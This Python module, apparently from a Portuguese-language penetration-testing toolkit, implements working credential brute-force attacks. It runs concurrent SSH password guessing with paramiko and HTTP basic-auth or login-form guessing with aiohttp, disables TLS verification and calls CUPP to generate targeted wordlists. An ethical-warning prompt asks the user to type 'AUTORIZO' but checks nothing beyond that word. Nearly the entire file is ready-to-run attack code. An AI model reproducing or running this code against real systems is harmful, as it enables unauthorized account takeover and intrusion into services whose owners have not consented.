#!/usr/bin/env python3
"""Brute force: aviso ético, wordlists, CUPP, SSH e HTTP (basic/form)."""

import asyncio
import shutil
import subprocess
import sys
from pathlib import Path

from colorama import Fore, Style

from . import i18n
from .core import PROJECT_ROOT, log


def print_ethical_warning(action: str) -> bool:
    """Alerta ético antes de operação intrusiva. Retorna True se autorizado."""
    print(f"\n{Fore.RED}{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] AVISO: {action} é ataque ativo.{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Use apenas em alvos com autorização por escrito.{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Uso não autorizado é crime (Lei 12.737/12, CFAA, etc).{Style.RESET_ALL}")
    print(f"{Fore.RED}{'=' * 60}{Style.RESET_ALL}")
    confirm = input(f"{Fore.YELLOW}Confirmar autorização? (digite 'AUTORIZO'): {Style.RESET_ALL}").strip()
    return confirm == "AUTORIZO"


def load_wordlist(path: str) -> list[str]:
    """Carrega wordlist do disco, deduplicando e ignorando linhas vazias."""
    p = Path(path).expanduser()
    if not p.is_file():
        print(f"{Fore.RED}Wordlist não encontrada: {p}{Style.RESET_ALL}")
        return []
    try:
        with p.open("r", encoding="utf-8", errors="ignore") as f:
            words = [w.strip() for w in f if w.strip()]
        return list(dict.fromkeys(words))
    except OSError as e:
        log.error("Falha ao ler wordlist %s: %s", p, e)
        return []


def cupp_generate() -> None:
    """Chama CUPP interativo p/ gerar wordlist customizada."""
    cupp_paths = [
        PROJECT_ROOT / "cupp" / "cupp.py",
        Path.cwd() / "cupp" / "cupp.py",
    ]
    cupp = next((p for p in cupp_paths if p.is_file()), None)
    if not cupp:
        print(f"{Fore.RED}CUPP não encontrado. Clone: git clone https://github.com/Mebus/cupp.git{Style.RESET_ALL}")
        return

    python_exe = shutil.which("python") or shutil.which("python3") or sys.executable
    try:
        subprocess.run([python_exe, str(cupp), "-i"], check=False)
    except OSError as e:
        log.error("CUPP execução falhou: %s", e)
        print(f"{Fore.RED}Erro ao rodar CUPP: {e}{Style.RESET_ALL}")


async def _ssh_try(host: str, port: int, user: str, password: str, timeout: int) -> tuple[str, str] | None:
    """Tenta uma credencial SSH. Retorna (user, pass) se sucesso."""
    import paramiko

    def _attempt() -> bool:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host, port=port, username=user, password=password,
                timeout=timeout, allow_agent=False, look_for_keys=False,
                banner_timeout=timeout, auth_timeout=timeout,
            )
            return True
        except paramiko.AuthenticationException:
            return False
        except (paramiko.SSHException, OSError, EOFError) as e:
            log.debug("SSH %s@%s:%s erro: %s", user, host, port, e)
            return False
        finally:
            client.close()

    ok = await asyncio.to_thread(_attempt)
    return (user, password) if ok else None


async def ssh_bruteforce(
    host: str,
    users: list[str],
    passwords: list[str],
    port: int = 22,
    workers: int = 8,
    delay: float = 0.1,
    timeout: int = 5,
) -> list[tuple[str, str]]:
    """Brute-force SSH assíncrono com controle de concorrência."""
    try:
        import paramiko  # noqa: F401
    except ImportError:
        print(f"{Fore.RED}paramiko não instalado. Rode: pip install paramiko{Style.RESET_ALL}")
        return []

    sem = asyncio.Semaphore(workers)
    found: list[tuple[str, str]] = []
    total = len(users) * len(passwords)
    tried = 0

    async def _guarded(u: str, p: str):
        nonlocal tried
        async with sem:
            await asyncio.sleep(delay)
            result = await _ssh_try(host, port, u, p, timeout)
            tried += 1
            if tried % 25 == 0:
                print(f"{Fore.CYAN}{i18n.t('brute.progress', tried=tried, total=total)}{Style.RESET_ALL}")
            if result:
                found.append(result)
                print(f"{Fore.GREEN}{i18n.t('brute.ssh_valid', user=u, pwd=p)}{Style.RESET_ALL}")

    tasks = [_guarded(u, p) for u in users for p in passwords]
    await asyncio.gather(*tasks)
    return found


async def http_bruteforce(
    url: str,
    users: list[str],
    passwords: list[str],
    mode: str = "basic",
    user_field: str = "username",
    pass_field: str = "password",
    fail_signature: str = "",
    workers: int = 10,
    delay: float = 0.1,
    timeout: int = 10,
) -> list[tuple[str, str]]:
    """Brute-force HTTP (basic-auth ou form POST)."""
    try:
        import aiohttp
    except ImportError:
        print(f"{Fore.RED}aiohttp não instalado. Rode: pip install aiohttp{Style.RESET_ALL}")
        return []

    sem = asyncio.Semaphore(workers)
    found: list[tuple[str, str]] = []
    total = len(users) * len(passwords)
    tried = 0

    timeout_cfg = aiohttp.ClientTimeout(total=timeout)
    connector = aiohttp.TCPConnector(limit=workers, ssl=False)

    async with aiohttp.ClientSession(timeout=timeout_cfg, connector=connector) as session:
        async def _attempt(u: str, p: str):
            nonlocal tried
            async with sem:
                await asyncio.sleep(delay)
                try:
                    if mode == "basic":
                        auth = aiohttp.BasicAuth(u, p)
                        async with session.get(url, auth=auth) as r:
                            ok = r.status not in (401, 403)
                    else:
                        payload = {user_field: u, pass_field: p}
                        async with session.post(url, data=payload, allow_redirects=False) as r:
                            body = await r.text()
                            ok = r.status in (200, 302) and (not fail_signature or fail_signature not in body)
                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    log.debug("HTTP %s %s:%s erro: %s", url, u, p, e)
                    ok = False

                tried += 1
                if tried % 25 == 0:
                    print(f"{Fore.CYAN}{i18n.t('brute.progress', tried=tried, total=total)}{Style.RESET_ALL}")
                if ok:
                    found.append((u, p))
                    print(f"{Fore.GREEN}{i18n.t('brute.http_valid', user=u, pwd=p)}{Style.RESET_ALL}")

        await asyncio.gather(*[_attempt(u, p) for u in users for p in passwords])
    return found
